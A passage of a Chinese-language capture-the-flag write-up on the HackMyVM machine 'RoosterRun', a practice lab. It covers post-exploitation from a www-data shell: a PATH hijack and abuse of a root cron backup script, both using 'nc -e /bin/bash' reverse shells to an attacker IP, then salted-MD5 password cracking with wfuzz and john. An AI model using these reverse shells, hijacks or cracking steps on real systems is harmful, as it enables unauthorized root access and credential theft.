www-data@rooSter-Run:/$ cat /etc/cron*
cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
cat: /etc/cron.yearly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
www-data@rooSter-Run:/$ cd /home
cd /home
www-data@rooSter-Run:/home$ ls
ls
matthieu
www-data@rooSter-Run:/home$ cd matthieu
cd matthieu
www-data@rooSter-Run:/home/matthieu$ ls -la
ls -la
total 40
drwxr-xr-x  4 matthieu matthieu 4096 Apr  5 06:41 .
drwxr-xr-x  3 root     root     4096 Sep 24  2023 ..
lrwxrwxrwx  1 root     root        9 Sep 24  2023 .bash_history -> /dev/null
-rw-r--r--  1 matthieu matthieu  220 Sep 22  2023 .bash_logout
-rw-r--r--  1 matthieu matthieu 3526 Sep 22  2023 .bashrc
drwxr-xr-x  3 matthieu matthieu 4096 Sep 22  2023 .local
drwxr-xr-x 12 matthieu matthieu 4096 Sep 22  2023 .oh-my-zsh
-rw-r--r--  1 matthieu matthieu  807 Sep 22  2023 .profile
-rw-r--r--  1 matthieu matthieu 3915 Sep 22  2023 .zshrc
-rwxr-xr-x  1 matthieu matthieu  302 Sep 23  2023 StaleFinder
-rwx------  1 matthieu matthieu   33 Sep 24  2023 user.txt
www-data@rooSter-Run:/home/matthieu$ file StaleFinder
file StaleFinder
StaleFinder: Bourne-Again shell script, ASCII text executable
www-data@rooSter-Run:/home/matthieu$ cat StaleFinder 
#!/usr/bin/env bash

for file in ~/*; do
    if [[ -f $file ]]; then
        if [[ ! -s $file ]]; then
            echo "$file is empty."
        fi
        
        if [[ $(find "$file" -mtime +365 -print) ]]; then
            echo "$file hasn't been modified for over a year."
        fi
    fi
done
```

找到数据库用户名和密码：

```apl
admin
j42W9kDq9dN9hK
```

尝试切换root，直接用这个密码，但是失败，乖乖尝试数据库：

```bash
www-data@rooSter-Run:/home/matthieu$ mysql -u admin -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 55604
Server version: 10.11.3-MariaDB-1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| cmsms_db           |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> use information_schema;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [information_schema]> show tables;
........
79 rows in set (0.000 sec)

MariaDB [information_schema]> select * from user_variables;
Empty set (0.000 sec)

MariaDB [information_schema]> use cmsms_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [cmsms_db]> show tables;
.........
53 rows in set (0.000 sec)

MariaDB [cmsms_db]> select * from cms_users;
+---------+----------+----------------------------------+--------------+------------+-----------+---------------------+--------+---------------------+---------------------+
| user_id | username | password                         | admin_access | first_name | last_name | email               | active | create_date         | modified_date       |
+---------+----------+----------------------------------+--------------+------------+-----------+---------------------+--------+---------------------+---------------------+
|       1 | admin    | 4f943036486b9ad48890b2efbf7735a8 |            1 |            |           | admin@localhost.com |      1 | 2023-09-20 07:28:39 | 2023-09-20 07:31:54 |
+---------+----------+----------------------------------+--------------+------------+-----------+---------------------+--------+---------------------+---------------------+
1 row in set (0.000 sec)
```

没东西。。。。。

尝试一下别的目录，以及suid都没啥发现，上传`linpeas.sh`。。。。。

```bash
# kali
python3 -m http.server 8888
# roosterrun
cd /tmp
wget http://172.20.10.8:8888/linpeas.sh;chmod +x linpeas.sh;./linpeas.sh
```

等的功夫我们分析一下这个脚本：

```bash
#!/usr/bin/env bash

for file in ~/*; do
    if [[ -f $file ]]; then					# 检查 $file 是否是一个普通文件
        if [[ ! -s $file ]]; then           # 检查 $file 是否为空
            echo "$file is empty."
        fi
        
        if [[ $(find "$file" -mtime +365 -print) ]]; then      # 查找在过去一年中没有被修改过的文件
            echo "$file hasn't been modified for over a year."
        fi
    fi
done
```

`linpeas.sh`运行完了，看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840360.png" alt="image-20240405153938675" style="zoom:50%;" />

> "File with ACLs" 是指一个文件被分配了访问控制列表（Access Control Lists，简称ACLs）。ACLs是计算机操作系统中用来定义哪些用户或系统进程可以对特定的文件、目录或其他资源执行哪些操作的一种机制。
>
> 具体来说，ACLs 可以为特定的用户或用户组分配不同的权限，例如读取、写入、执行等。这种机制提供了比传统的“所有者-组-其他”权限模型更细粒度的控制。通过ACLs，管理员可以精确地控制哪些用户或用户组可以访问或修改特定的文件或目录。
>
> ACLs 在许多现代操作系统中都有实现，例如 Windows、macOS 和一些 Unix-like 系统（通过特定的文件系统或扩展）。
>
> 使用 ACLs 可以提高系统的安全性，因为它允许管理员更精确地控制资源的访问。然而，它也可能增加管理的复杂性，因为需要仔细配置每个资源的访问权限。

### 定时任务触发"bash"

看一下，这个目录应该也是比较常出问题的目录，这次忘了看了。。。。但是里面啥都没有

仔细看会发现有一个奇怪的东西：

```bash
#!/usr/bin/env bash
```

它如果要执行的话直接`#!/bin/bash`不就好了，打印一下环境变量看一下：

```bash
www-data@rooSter-Run:/home/matthieu$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

nice，我们可以掌控的目录在`/usr/bin`前面，我们写一个bash丢在`usr/local/bin`里面，然后再让用户执行程序反弹shell试试：

```bash
# /usr/local/bin
echo 'nc -e /bin/bash 172.20.10.8 2345' > bash
```

唯一的问题是，这个程序得是一个定时任务，而我们又没有发现，上传`pspy64`分析一下，且慢，刚准备上传就弹回来了；

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840361.png" alt="image-20240405160003815" style="zoom:50%;" />

### 提权至root

上传一个`pspy64`，看看还有没有其他的定时任务：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840362.png" alt="image-20240405160610449" style="zoom:50%;" />

root权限执行了定时任务`/usr/sbin/CRON`以及`/bin/sh -c /bin/bash /opt/maintenance/backup.sh`，查看一下：

```bash
file cron
cron: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9335596096312f1bd1e8a0ab857f0690639a5810, for GNU/Linux 3.2.0, stripped

cat /opt/maintenance/backup.sh
#!/bin/bash

PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"


for file in "$PREPROD"/*; do
  if [[ -f $file && "${file##*.}" = "sh" ]]; then
    cp "$file" "$PROD"
  else
    rm -f ${file}
  fi
done

for file in "$PROD"/*; do
  if [[ -f $file && ! -O $file ]]; then
  rm ${file}
  fi
done

/usr/bin/run-parts /opt/maintenance/prod-tasks
```

脚本执行了两个事情：

1. 复制 `PREPROD` 目录下的所有 `.sh` 脚本文件到 `PROD` 目录，并删除 `PREPROD` 目录下非 `.sh` 文件。
2. 删除 `PROD` 目录下不属于当前用户所有的文件。

创建一把`.sh`文件，尝试让他复制到`prod-tasks`，然后让`/usr/bin/run-parts`执行一下：

```bash
(remote) matthieu@rooSter-Run:/opt/maintenance$ file /usr/bin/run-parts
/usr/bin/run-parts: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9bddbabd4f1a9d2f4646a3190e3bcef23a34d332, for GNU/Linux 3.2.0, stripped
```

拿到本地来反编译一下，等一下，调试信息被搞掉了。。。。

只能摸黑弄了，希望可以执行：

```bash
cd /opt/maintenance/pre-prod-tasks 
echo 'nc -e /bin/bash 172.20.10.8 3456' > getshell.sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840364.png" alt="image-20240405163131945" style="zoom: 50%;" />

脚本已经执行了，但是为什么没有弹回来shell呢？发现这个文件所有者已经是root了，尝试修改名称，看看能不能执行，（shell脚本的后半段估计就是按暗示）：

```bash
mv getshell.sh getshell
```

稍等片刻，看看能不能弹回来，没有执行权限，更改一下执行权限：

```bash
cd /opt/maintenance/pre-prod-tasks 
echo 'nc -e /bin/bash 172.20.10.8 3456' >> pwn.sh
chmod +x pwn.sh

cd /opt/maintenance/prod-tasks
head pwn.sh
mv pwn.sh pwn
```

但是没弹回来，加上一个头

```
cd /opt/maintenance/pre-prod-tasks 
echo '#!/bin/bash' > exp.sh
echo 'nc -e /bin/bash 172.20.10.8 3456' >> exp.sh
chmod +x exp.sh

cd /opt/maintenance/prod-tasks
head exp.sh
mv exp.sh exp
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840365.png" alt="image-20240405165715141" style="zoom:50%;" />

拿到shell！！！！！

查看一下flag！！！

```bash
cat /root/root.txt
670ff72e9d8099ac39c74c080348ec17
cd /home
ls
matthieu
cd matthieu
cat user.txt
32af3c9a9cb2fb748aef29457d8cff55
```

## 额外收获

### 爆破密码

[绿师傅](https://hackmyvm.eu/public/?u=kerszi)在爆破那个密码的时候尝试了另一种思路，我没有想到，记录一下：

```bash
wfuzz -w /usr/share/wordlists/rockyou.txt -d 'username=admin&password=FUZZ&loginsubmit=Submit' -u http://172.20.10.3/admin/login.php --hh 4569
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840366.png" alt="image-20240405133906909" style="zoom:50%;" />

我看到师傅门的blog爆破方式普遍是：

```bash
john pass_hash --wordlist=/usr/share/wordlists/rockyou.txt -rules=best64 -format=dynamic_4
```

```bash
john pass_hash --wordlist=/usr/share/wordlists/rockyou.txt -rules=best64 -format=dynamic_4
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic_4 [md5($s.$p) (OSC) 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
homeandaway      (admin)     
1g 0:00:00:04 DONE (2024-04-05 02:03) 0.2164g/s 4363p/s 4363c/s 4363C/s yasmeen..spongy
Use the "--show --format=dynamic_4" options to display all of the cracked passwords reliably
Session completed. 
```

[群主师傅](https://hackmyvm.eu/profile/?user=ll104567)说通过`john --list=formats`可以查到使用哪些加密方式爆破，但是还需要查一下使用哪种加密方式，群主师傅提供了一种解决方案：(我也在本地查了一下，但是字体没有师傅的好看，我就直接复制师傅给的图片了，全都是群主师傅帮忙搞出来的！)

```bash
john --list=subformats
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840367.png" alt="img" style="zoom:50%;" />

例如这里的`dynamic_4`就是盐在前面，`password`在后面的，可以使用以下命令进行规定：

```bash
john pass_hash --wordlist=/usr/share/wordlists/rockyou.txt --format=dynamic='md5($s.$p)'
[1]  + killed     wfuzz -w /usr/share/wordlists/rockyou.txt -d  -u  --hh 4549
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic=md5($s.$p) [256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
homeandaway      (admin)     
1g 0:00:00:02 DONE (2024-04-05 02:34) 0.3623g/s 7304p/s 7304c/s 7304C/s yasmeen..spongy
Use the "--show --format=dynamic=md5($s.$p)" options to display all of the cracked passwords reliably
Session completed. 
```

问题来了，这里的加盐实际上盐是在后面的。。。。然后我问了一下群主，他给出了一些解释：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840368.jpg" alt="VeryCapture_20240405145359" style="zoom: 33%;" />

如果你也想让群主大大指点，可以加入一下我们的群：`660930334`，为群主大大点赞！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840369.png" alt="image-20240405145811092" style="zoom: 33%;" />

群主大大提供了一种思路，我们实践一下：

以`123456`(rockyou第一个密码)为例，盐值使用`hackmyvm` --> `6861636b6d79766d`，尝试复现一下：

首先就是一个大坑，请看`VCR`:

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840370.png" alt="image-20240405181626642" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840371.png" alt="image-20240405181657295" style="zoom:50%;" />

so发现了吗，echo自带换行符的。。。。。

所以我们就得小心了。。。。

```bash
echo -n "1234566861636b6d79766d"|md5sum |cut -d" " -f1 > hashr
echo -n "6861636b6d79766d123456"|md5sum |cut -d" " -f1 > hashl
```

```bash
echo '4cc1d0e2ba8ae43d7efe5715b60f045c$6861636b6d79766d' > addsalthashr
echo 'e294fd515d73bfca98301b9a6068b1ae$6861636b6d79766d' > addsalthashl
```

```bash
john addsalthashr --wordlist=/usr/share/wordlists/rockyou.txt --format=dynamic='md5($s.$p)'
john addsalthashr --wordlist=/usr/share/wordlists/rockyou.txt --format=dynamic='md5($p.$s)'
john addsalthashl --wordlist=/usr/share/wordlists/rockyou.txt --format=dynamic='md5($p.$s)'
john addsalthashl --wordlist=/usr/share/wordlists/rockyou.txt --format=dynamic='md5($s.$p)'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840372.png" alt="image-20240405183205220" style="zoom:33%;" />

所以john会自动识别盐是谁，hash是哪个，我们那个format只是规定了密码和盐在加密前的相对位置！感谢群主师傅！

群主师傅的演示：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840373.png" alt="img" style="zoom:50%;" />

放入文件读取也是一样的，不管你几行都会有换行符！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840374.png" alt="image-20240405183950641" style="zoom:50%;" />

